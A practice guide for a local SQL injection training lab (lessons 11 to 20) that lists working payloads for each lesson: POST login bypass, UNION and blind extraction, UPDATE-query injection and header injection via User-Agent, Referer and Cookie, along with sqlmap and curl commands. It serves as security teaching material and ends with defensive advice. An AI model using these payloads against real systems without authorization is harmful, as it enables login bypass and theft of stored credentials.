# SQL Injection Practice Guide - Less-11 to Less-20
# Lab URL: http://localhost:8888

## Less-11: Error Based - POST (Login Form)

### Objective: POST-based SQL injection in login forms

### Step-by-Step:
1. **Access Login Form**: http://localhost:8888/Less-11/
   - Expected: Login form with username and password fields

2. **Test Basic Login**:
   - Username: admin
   - Password: admin
   - Expected: Wrong username or password message

3. **Test SQL Injection in Username Field**:
   - Username: `admin' --`
   - Password: anything
   - Expected: Successful login or error message

4. **UNION Attack via Username**:
   - Username: `admin' UNION SELECT 1,2 --`
   - Password: anything
   - Expected: Error revealing column count

5. **Extract Database Information**:
   - Username: `admin' UNION SELECT 1,DATABASE() --`
   - Password: anything

6. **Extract User Data**:
   - Username: `admin' UNION SELECT username,password FROM users --`
   - Password: anything

7. **Alternative: Password Field Injection**:
   - Username: admin
   - Password: `admin' OR '1'='1' --`

### Using Burp Suite/Intercepting POST:
```
POST /Less-11/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=admin' UNION SELECT 1,DATABASE() --&passwd=test&submit=Submit
```

---

## Less-12: Error Based - POST (Double Quotes)

### Objective: POST-based injection with double quotes

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-12/
2. **Test Double Quote Injection**:
   - Username: `admin") --`
   - Password: anything
3. **UNION Attack**:
   - Username: `admin") UNION SELECT 1,2 --`
   - Password: anything
4. **Extract Data**:
   - Username: `admin") UNION SELECT username,password FROM users --`
   - Password: anything

---

## Less-13: Error Based - POST (Single Quote with Parentheses)

### Objective: POST injection with single quotes and parentheses

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-13/
2. **Test Injection**:
   - Username: `admin') --`
   - Password: anything
3. **UNION Attack**:
   - Username: `admin') UNION SELECT 1,2 --`
   - Password: anything
4. **Extract Data**:
   - Username: `admin') UNION SELECT username,password FROM users --`
   - Password: anything

---

## Less-14: Error Based - POST (Double Quotes with Parentheses)

### Objective: POST injection with double quotes and parentheses

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-14/
2. **Test Injection**:
   - Username: `admin") --`
   - Password: anything
3. **UNION Attack**:
   - Username: `admin") UNION SELECT 1,2 --`
   - Password: anything
4. **Extract Data**:
   - Username: `admin") UNION SELECT username,password FROM users --`
   - Password: anything

---

## Less-15: Boolean Based Blind - POST

### Objective: POST-based blind SQL injection

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-15/
2. **Test True Condition**:
   - Username: `admin' AND 1=1 --`
   - Password: anything
   - Expected: "flag.jpg" image displayed
3. **Test False Condition**:
   - Username: `admin' AND 1=2 --`
   - Password: anything
   - Expected: No image displayed
4. **Extract Database Name Length**:
   - Username: `admin' AND LENGTH(DATABASE())=8 --`
   - Password: anything
5. **Extract Database Name Character by Character**:
   - Username: `admin' AND SUBSTRING(DATABASE(),1,1)='s' --`
   - Password: anything
6. **Extract Table Names**:
   - Username: `admin' AND SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1)='u' --`
   - Password: anything
7. **Extract User Data**:
   - Username: `admin' AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='D' --`
   - Password: anything

---

## Less-16: Time Based Blind - POST

### Objective: POST-based time-based blind injection

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-16/
2. **Test Time Delay**:
   - Username: `admin' AND SLEEP(5) --`
   - Password: anything
   - Expected: 5-second delay
3. **Conditional Time Delay**:
   - Username: `admin' AND IF(1=1,SLEEP(5),0) --`
   - Password: anything
4. **Extract Database Name**:
   - Username: `admin' AND IF(SUBSTRING(DATABASE(),1,1)='s',SLEEP(5),0) --`
   - Password: anything
5. **Extract Table Names**:
   - Username: `admin' AND IF(SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1)='u',SLEEP(5),0) --`
   - Password: anything
6. **Extract User Data**:
   - Username: `admin' AND IF(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='D',SLEEP(5),0) --`
   - Password: anything

---

## Less-17: Update Query - POST

### Objective: SQL injection in UPDATE statements

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-17/
2. **Test Normal Update**:
   - Username: admin
   - Password: admin
   - Expected: Password reset form appears
3. **Test SQL Injection in Password Field**:
   - New Password: `test' --`
   - Expected: Error message or successful update
4. **Extract Data via Error**:
   - New Password: `test' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --`
5. **Extract User Data**:
   - New Password: `test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e)) --`
6. **Extract Password Data**:
   - New Password: `test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e)) --`

---

## Less-18: Header Injection - User-Agent

### Objective: SQL injection via HTTP headers

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-18/
2. **Login with Valid Credentials**:
   - Username: admin
   - Password: admin
3. **After Login, Inject via User-Agent Header**:
   - Use Burp Suite to intercept and modify User-Agent
   - User-Agent: `Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --`
4. **Extract Database Name**:
   - User-Agent: `Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --`
5. **Extract Table Names**:
   - User-Agent: `Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),0x7e)) --`
6. **Extract User Data**:
   - User-Agent: `Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e)) --`

### Manual Request Example:
```
POST /Less-18/ HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --
Content-Type: application/x-www-form-urlencoded

uname=admin&passwd=admin&submit=Submit
```

---

## Less-19: Header Injection - Referer

### Objective: SQL injection via Referer header

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-19/
2. **Login with Valid Credentials**:
   - Username: admin
   - Password: admin
3. **Inject via Referer Header**:
   - Referer: `http://localhost:8888/' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --`
4. **Extract Database Information**:
   - Referer: `http://localhost:8888/' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e)) --`
5. **Extract User Data**:
   - Referer: `http://localhost:8888/' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e)) --`

### Manual Request Example:
```
POST /Less-19/ HTTP/1.1
Host: localhost:8888
Referer: http://localhost:8888/' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --
Content-Type: application/x-www-form-urlencoded

uname=admin&passwd=admin&submit=Submit
```

---

## Less-20: Header Injection - Cookie

### Objective: SQL injection via Cookie header

### Step-by-Step:
1. **Access Form**: http://localhost:8888/Less-20/
2. **Login with Valid Credentials**:
   - Username: admin
   - Password: admin
3. **Note the Cookie Set**:
   - Cookie: `uname=admin`
4. **Inject via Cookie**:
   - Cookie: `uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --`
5. **Extract Database Information**:
   - Cookie: `uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e)) --`
6. **Extract User Data**:
   - Cookie: `uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e)) --`

### Manual Request Example:
```
GET /Less-20/ HTTP/1.1
Host: localhost:8888
Cookie: uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --
```

---

## Quick Reference for Less-11 to Less-20

| Lesson | Type | Injection Point | Example Payload |
|--------|------|----------------|-----------------|
| Less-11 | Error-based | POST (') | `admin' UNION SELECT 1,2 --` |
| Less-12 | Error-based | POST (") | `admin") UNION SELECT 1,2 --` |
| Less-13 | Error-based | POST (') + () | `admin') UNION SELECT 1,2 --` |
| Less-14 | Error-based | POST (") + () | `admin") UNION SELECT 1,2 --` |
| Less-15 | Boolean Blind | POST (') | `admin' AND 1=1 --` |
| Less-16 | Time Blind | POST (') | `admin' AND SLEEP(5) --` |
| Less-17 | Update Query | POST (') | `test' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --` |
| Less-18 | Header Injection | User-Agent | `Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --` |
| Less-19 | Header Injection | Referer | `http://localhost/' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --` |
| Less-20 | Header Injection | Cookie | `uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --` |

---

## Common POST Injection Patterns

### Basic Login Bypass:
```
Username: admin' OR '1'='1' --
Password: anything
```

### UNION Attack in POST:
```
Username: admin' UNION SELECT 1,DATABASE() --
Password: anything
```

### Boolean Blind POST:
```
Username: admin' AND 1=1 --
Password: anything
```

### Time-Based Blind POST:
```
Username: admin' AND SLEEP(5) --
Password: anything
```

---

## Header Injection Techniques

### EXTRACTVALUE Method:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --
```

### UPDATEXML Method:
```sql
' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1) --
```

### Common Headers to Test:
- User-Agent
- Referer
- Cookie
- X-Forwarded-For
- X-Real-IP
- Accept
- Accept-Language

---

## Tools and Techniques

### Using Burp Suite:
1. **Intercept Requests**: Turn on Proxy → Intercept
2. **Modify Headers**: Edit User-Agent, Referer, Cookie
3. **Repeater**: Send modified requests repeatedly
4. **Intruder**: Automate payload testing

### Using sqlmap:
```bash
# POST injection
sqlmap -u "http://localhost:8888/Less-11/" --data "uname=admin&passwd=admin&submit=Submit" -p uname

# Header injection
sqlmap -u "http://localhost:8888/Less-18/" --headers "User-Agent: Mozilla/5.0*" --cookie "PHPSESSID=abc123"
```

### Manual Testing with curl:
```bash
# POST injection
curl -X POST -d "uname=admin' UNION SELECT 1,DATABASE() --&passwd=test&submit=Submit" http://localhost:8888/Less-11/

# Header injection
curl -H "User-Agent: Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --" http://localhost:8888/Less-18/
```

---

## Practice Tips for Less-11 to Less-20:

1. **Master POST Injection** - Most real-world apps use POST
2. **Learn Header Injection** - Often overlooked attack vector
3. **Understand Different Quote Types** - Single, double, with/without parentheses
4. **Practice Blind Techniques** - Essential for modern applications
5. **Use Burp Suite** - Critical for header manipulation
6. **Test All Input Fields** - Don't just focus on obvious ones
7. **Document Successful Payloads** - Each lesson has specific syntax

---

## Expected Results Summary:

- **Less-11**: POST-based UNION injection works
- **Less-12**: Same as Less-11 but with double quotes
- **Less-13**: Close parentheses with single quotes
- **Less-14**: Close parentheses with double quotes
- **Less-15**: Boolean blind via POST (flag.jpg appears/disappears)
- **Less-16**: Time-based blind via POST (delays occur)
- **Less-17**: UPDATE query injection (password gets updated)
- **Less-18**: User-Agent header injection (errors in response)
- **Less-19**: Referer header injection (errors in response)
- **Less-20**: Cookie injection (errors in response)

---

## Security Notes:

⚠️ **Real-World Applications**:
- POST injections are more common than GET
- Header injections are often overlooked
- Modern WAFs may block obvious payloads
- Always test with proper authorization

🔒 **Defense Mechanisms**:
- Use parameterized queries for all inputs
- Validate and sanitize HTTP headers
- Implement proper input validation
- Use prepared statements consistently
